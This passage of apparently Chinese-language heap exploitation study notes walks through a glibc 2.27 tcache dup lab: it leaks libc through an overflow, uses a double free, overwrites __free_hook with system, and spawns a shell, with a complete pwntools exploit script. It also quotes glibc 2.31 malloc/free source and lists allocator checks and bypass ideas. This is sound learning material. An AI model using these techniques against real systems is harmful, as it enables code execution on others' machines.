class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>這邊踩了一個坑，就是我們使用的的docker Glibc雖然是2.27，但是2.27保護機制跟裸奔一樣，所以有patch上保護，在2.27-3Ubuntu1.3加入key機制，所以我這邊找了比較舊的libc來patch上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LD:</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so tcachedup</span><br><span class="line">LIBC:</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc_32.so.6 tcachedup</span><br></pre></td></tr></table></figure>

<p>首先先觀察一下，會發現這題跟原本很像，主要有兩個不同<br>第一個是這，這裡有BOF跟partial overwrite</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, name, <span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, name);</span><br></pre></td></tr></table></figure>


<p>第二個不同是，原本的ptr array變成了變數，一次只能操作當前最新malloc的chunk</p>
<p>首先我們先leak libc，蓋0x78個a+一個\n會蓋到stack上的libc前面，printf會把它印出來，之後offset用動態抓扣出來<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJsAe9cvA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJsAe9cvA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/rkazxc9PA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rkazxc9PA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>我們可以看到double free完後他變成了一個指向自己的循環</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache bin -&gt; chunk 1 -&gt; chunk 1 -&gt; ...</span><br></pre></td></tr></table></figure>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/Bkr-6F5vR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bkr-6F5vR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>目前腳本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./tcachedup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x21b97</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(r.recvline().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=leak_libc-offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ leak libc: &#x27;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ libc base: &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache dup</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">	r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;g_ptrs: &#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> r.recvline().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">val</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.send(val)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">	r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>接下來malloc會拿到chunk 1<br>之後我們先找兩個東西的offset，free hook(0x3ebc30)跟system(0x4f440)</p>
<p>我們把malloc的fd改成free hook，如圖已經改寫成功，所以tcache bin變成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache bin -&gt; chunk 1 -&gt; free hook</span><br></pre></td></tr></table></figure>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/B1Tbnq9wC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1Tbnq9wC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>create兩次拿到free hook，寫入system，之後直接malloc一塊，把記憶體寫成&#x2F;bin&#x2F;sh，這樣就會有一個<code>free(ptr)</code>，ptr-&gt;&#x2F;bin&#x2F;sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(&quot;/bin/sh&quot;) -&gt; (*__free_hook)(&quot;/bin/sh&quot;) -&gt; system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="script-2"><a href="#script-2" class="headerlink" title="script"></a>script</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./tcachedup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x21b97</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(r.recvline().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=leak_libc-offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ leak libc: &#x27;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ libc base: &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache dup</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;g_ptrs: &#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> r.recvline().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">val</span>):</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.send(val)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free_hook_offset = <span class="number">0x3ed8e8</span></span><br><span class="line">system_offset = <span class="number">0x4f440</span></span><br><span class="line"></span><br><span class="line">free_hook = free_hook_offset + libc_base</span><br><span class="line">libc_system = system_offset + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&#x27;NAUPINFO @ free_hook: &#x27;,hex(free_hook))</span></span><br><span class="line"><span class="comment">#print(&#x27;NAUPINFO @ system: &#x27;,hex(libc_system))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>(p64(free_hook))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>(p64(libc_system))</span><br><span class="line">create(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>備註: 可以加個sleep，這樣就不會送太快導致一些問題</p>
<h2 id="large-bin-Glibc-2-23"><a href="#large-bin-Glibc-2-23" class="headerlink" title="large bin(Glibc 2.23)"></a>large bin(Glibc 2.23)</h2><h3 id="source-code-3"><a href="#source-code-3" class="headerlink" title="source code"></a>source code</h3><p><div class="img-item" data-src="https://hackmd.io/_uploads/ryPD-E-uC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryPD-E-uC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="glibc-2-31機制及保護"><a href="#glibc-2-31機制及保護" class="headerlink" title="glibc 2.31機制及保護"></a>glibc 2.31機制及保護</h2><p>這版本引入了Tcache key的安全機制，在free之前會檢查key</p>
<h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3021">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3021</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">_Static_assert</span> (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="number">2</span>,</span><br><span class="line">                  <span class="string">&quot;PTRDIFF_MAX is not more than half of SIZE_MAX&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure>

<h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free"></a>__libc_free</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3085">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3085</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">	 Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">	  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure>

<h3 id="malloc-tcache-安全機制"><a href="#malloc-tcache-安全機制" class="headerlink" title="malloc-tcache 安全機制"></a>malloc-tcache 安全機制</h3><p>無檢測</p>
<h3 id="free-tcache-安全機制"><a href="#free-tcache-安全機制" class="headerlink" title="free-tcache 安全機制"></a>free-tcache 安全機制</h3><h4 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc 2.31"></a>glibc 2.31</h4><blockquote>
<p>free(): double free detected in tcache 2</p>
</blockquote>
<p>tcache裡面的chunk，bk會放tcache key，在free的時候會去檢查</p>
<p>可以透過UAF蓋掉tcache key，或是把tcache打滿七個去打fastbin</p>
<h4 id="glibc-2-32"><a href="#glibc-2-32" class="headerlink" title="glibc 2.32"></a>glibc 2.32</h4><blockquote>
<p>free(): unaligned chunk detected in tcache 2</p>
</blockquote>
<p>tcache key引入加密機制，會檢查解密結果是否正確</p>
<h4 id="glibc-2-35"><a href="#glibc-2-35" class="headerlink" title="glibc 2.35"></a>glibc 2.35</h4><blockquote>
<p>free(): too many chunks detected in tcache</p>
</blockquote>
<p>遍歷所有tcache chunk並計算數量，最後與mp_.tcache_count比較，若小於則crash，防止對tcache-&gt;counts[tc_idx]竄改</p>
<h3 id="malloc-fastbin"><a href="#malloc-fastbin" class="headerlink" title="malloc-fastbin"></a>malloc-fastbin</h3><h4 id="all"><a href="#all" class="headerlink" title="all"></a>all</h4><blockquote>
<p>malloc(): memory corruption (fast)</p>
</blockquote>
<h4 id="glibc-2-32-1"><a href="#glibc-2-32-1" class="headerlink" title="glibc 2.32"></a>glibc 2.32</h4><blockquote>
<p>malloc(): unaligned fastbin chunk detected 1&#x2F;2&#x2F;3</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yizishun.com/index.php/2024/02/10/glibc-2-31-malloc%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E5%88%9D%E6%8E%A2/#int_malloc_han_shu_he_int_free_han_shu">https://www.yizishun.com/index.php/2024/02/10/glibc-2-31-malloc%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E5%88%9D%E6%8E%A2/#int_malloc_han_shu_he_int_free_han_shu</a></p>
<h3 id="free-fastbin"><a href="#free-fastbin" class="headerlink" title="free-fastbin"></a>free-fastbin</h3><blockquote>
<p>free(): invalid next size (fast)</p>
</blockquote>
<blockquote>
<p>double free or corruption (fasttop)</p>
</blockquote>
<blockquote>
<p>invalid fastbin entry (free)</p>
</blockquote>
<h3 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h3><blockquote>
<p>corrupted size vs. prev_size</p>
</blockquote>
<blockquote>
<p>corrupted double-linked list</p>
</blockquote>
<blockquote>
<p>corrupted double-linked list (not small)</p>
</blockquote>
<h3 id="malloc-unsorted-bin"><a href="#malloc-unsorted-bin" class="headerlink" title="malloc-unsorted bin"></a>malloc-unsorted bin</h3><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><p><a target="_blank" rel="noopener" href="https://www.yizishun.com/index.php/2024/02/10/glibc-2-31-malloc%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E5%88%9D%E6%8E%A2/">https://www.yizishun.com/index.php/2024/02/10/glibc-2-31-malloc%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E5%88%9D%E6%8E%A2/</a></p>
<p><a target="_blank" rel="noopener" href="https://bestwing.me/Education_Heap_Exploit_glibc_2.31.html">https://bestwing.me/Education_Heap_Exploit_glibc_2.31.html</a></p>
<h2 id="Tcache-dup-glibc-2-31"><a href="#Tcache-dup-glibc-2-31" class="headerlink" title="Tcache dup(glibc 2.31)"></a>Tcache dup(glibc 2.31)</h2><h3 id="demo-5"><a href="#demo-5" class="headerlink" title="demo"></a>demo</h3><h4 id="source-code-4"><a href="#source-code-4" class="headerlink" title="source code"></a>source code</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 